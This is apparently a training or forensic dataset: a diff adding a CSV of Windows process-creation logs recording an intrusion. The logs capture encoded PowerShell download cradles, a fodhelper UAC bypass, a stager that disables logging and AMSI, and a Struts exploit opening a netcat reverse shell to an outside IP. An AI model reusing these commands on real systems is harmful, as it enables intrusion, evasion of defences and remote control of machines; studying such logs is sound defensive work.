@@ -1,0 +1,1501 @@
+"_time",host,EventCode,Message
+"2018-08-20T14:28:40.000+0100","MKRAEUS-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		MKRAEUS-L$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xf7c
+	New Process Name:	C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x1f38
+	Creator Process Name:	C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngentask.exe
+	Process Command Line:	""C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe"" install ""Microsoft.PowerShell.Commands.Utility, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" /NoDependencies /noroot /version:v4.0.30319 /LegacyServiceBehavior
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T14:28:37.000+0100","MKRAEUS-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		MKRAEUS-L$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x130
+	New Process Name:	C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x1f38
+	Creator Process Name:	C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngentask.exe
+	Process Command Line:	""C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe"" install ""Microsoft.PowerShell.Security, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" /NoDependencies /noroot /version:v4.0.30319 /LegacyServiceBehavior
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:57:15.000+0100","ABUNGST-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\AlBungstein
+	Account Name:		AlBungstein
+	Account Domain:		AzureAD
+	Logon ID:		0x1A28E3
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xb7c
+	New Process Name:	C:\Windows\System32\conhost.exe
+	Token Elevation Type:	%%1938
+	Mandatory Label:		Mandatory Label\Medium Mandatory Level
+	Creator Process ID:	0x1aa0
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:57:15.000+0100","ABUNGST-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\AlBungstein
+	Account Name:		AlBungstein
+	Account Domain:		AzureAD
+	Logon ID:		0x1A28E3
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1aa0
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1938
+	Mandatory Label:		Mandatory Label\Medium Mandatory Level
+	Creator Process ID:	0xe8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwBlADAATQB3ADkAdwAiACkA 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:52:16.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		FYODOR-L$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1bf4
+	New Process Name:	C:\Windows\System32\tar.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x1548
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\tar.exe"" -cvzf archive.tar *
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:34:00.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xedc
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x226c
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:33:45.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xb84
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x226c
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""mknod /tmp/backpipe p""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:32:13.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x226c
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1c74
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoP -NonI -W Hidden -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAQgBMAEUALgBQAFMAVgBlAHIAUwBpAE8ATgAuAE0AQQBKAG8AcgAgAC0ARwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcARQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEAbABVAEUAKAAkAG4AVQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAYQBMAD0AWwBDAG8ATABMAGUAYwBUAGkAbwBuAFMALgBHAEUAbgBFAHIASQBjAC4ARABpAEMAdABpAG8AbgBBAHIAeQBbAFMAVABSAGkATgBnACwAUwB5AFMAVABlAG0ALgBPAEIASgBFAGMAdABdAF0AOgA6AG4ARQBXACgAKQA7ACQAVgBBAEwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEATAB9AEUAbABzAEUAewBbAFMAQwByAEkAUABUAEIAbABvAGMAawBdAC4AIgBHAEUAVABGAEkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAFQAVgBBAGwAdQBlACgAJABuAHUAbABsACwAKABOAGUAdwAtAE8AQgBKAEUAYwBUACAAQwBvAEwAbABlAGMAdABpAE8AbgBTAC4ARwBlAE4ARQBSAGkAQwAuAEgAQQBTAGgAUwBlAFQAWwBTAFQAcgBJAG4AZwBdACkAKQB9ACQAUgBlAGYAPQBbAFIARQBmAF0ALgBBAFMAcwBlAE0AYgBsAFkALgBHAGUAdABUAFkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUAZgAuAEcAZQBUAEYAaQBFAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAEwAVQBlACgAJABuAFUAbABMACwAJAB0AHIAVQBlACkAOwB9ADsAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AUwBFAHIAdgBJAEMARQBQAG8AaQBuAFQATQBhAG4AYQBnAGUAcgBdADoAOgBFAFgAcABlAGMAdAAxADAAMABDAG8AbgBUAGkAbgBVAEUAPQAwADsAJABXAGMAPQBOAEUAdwAtAE8AYgBKAGUAYwBUACAAUwBZAFMAdABFAG0ALgBOAEUAVAAuAFcAZQBCAEMATABJAEUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAHcAYwAuAEgAZQBhAEQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAEgAZQBhAEQARQBSAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBvAHgAWQA9AFsAUwBZAHMAVABFAE0ALgBOAGUAdAAuAFcARQBCAFIARQBxAFUARQBTAFQAXQA6ADoARABlAEYAYQBVAGwAdABXAGUAQgBQAHIAbwB4AHkAOwAkAFcAYwAuAFAAUgBPAFgAWQAuAEMAcgBFAEQARQBuAFQASQBhAGwAcwAgAD0AIABbAFMAeQBzAHQARQBNAC4ATgBlAHQALgBDAHIAZQBEAGUATgB0AGkAYQBMAEMAYQBjAEgAZQBdADoAOgBEAGUAZgBhAHUATAB0AE4AZQB0AFcATwByAEsAQwBSAEUARABlAG4AVABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABFAE0ALgBUAEUAeABUAC4ARQBOAEMAbwBEAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAWQBUAEUAcwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAEUAeABUAC4ARQBOAGMAbwBkAEkAbgBnAF0AOgA6AFUATgBpAGMATwBkAGUALgBHAGUAdABTAHQAUgBpAG4ARwAoAFsAQwBPAE4AdgBFAHIAVABdADoAOgBGAHIATwBtAEIAQQBTAGUANgA0AFMAdABSAEkAbgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkAHcAQwAuAEgAZQBhAGQARQByAHMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAUAB0AGgAQQBWAGcAcwA9AHYAdgA2AHIAVwBSADQAMABwAFkAUgBLAHkAeAA4AGEAMABIADMAbwBwADcAMgBvAGQAVgBVAD0AIgApADsAJABkAEEAdABBAD0AJABXAGMALgBEAG8AVwBuAEwAbwBBAGQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABEAGEAdABhAFsAMAAuAC4AMwBdADsAJABkAGEAdABhAD0AJABEAEEAVABhAFsANAAuAC4AJABEAGEAVABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBvAEkAbgBbAEMAaABBAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:32:12.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1dcc
+	New Process Name:	C:\Windows\System32\conhost.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1c74
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:32:12.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1c74
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x288c
+	Creator Process Name:	C:\Windows\System32\fodhelper.exe
+	Process Command Line:	""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:32:12.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		FYODOR-L$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Process Information:
+	New Process ID:		0x288c
+	New Process Name:	C:\Windows\System32\fodhelper.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x15d4
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\fodhelper.exe"" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:32:12.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091CB1
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1944
+	New Process Name:	C:\Windows\System32\fodhelper.exe
+	Token Elevation Type:	%%1938
+	Mandatory Label:		Mandatory Label\Medium Mandatory Level
+	Creator Process ID:	0x15d4
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\fodhelper.exe"" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:32:11.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091CB1
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xfc0
+	New Process Name:	C:\Windows\System32\whoami.exe
+	Token Elevation Type:	%%1938
+	Mandatory Label:		Mandatory Label\Medium Mandatory Level
+	Creator Process ID:	0x15d4
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\whoami.exe"" /groups
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:32:10.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091CB1
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x2b98
+	New Process Name:	C:\Windows\System32\whoami.exe
+	Token Elevation Type:	%%1938
+	Mandatory Label:		Mandatory Label\Medium Mandatory Level
+	Creator Process ID:	0x15d4
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\whoami.exe"" /groups
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
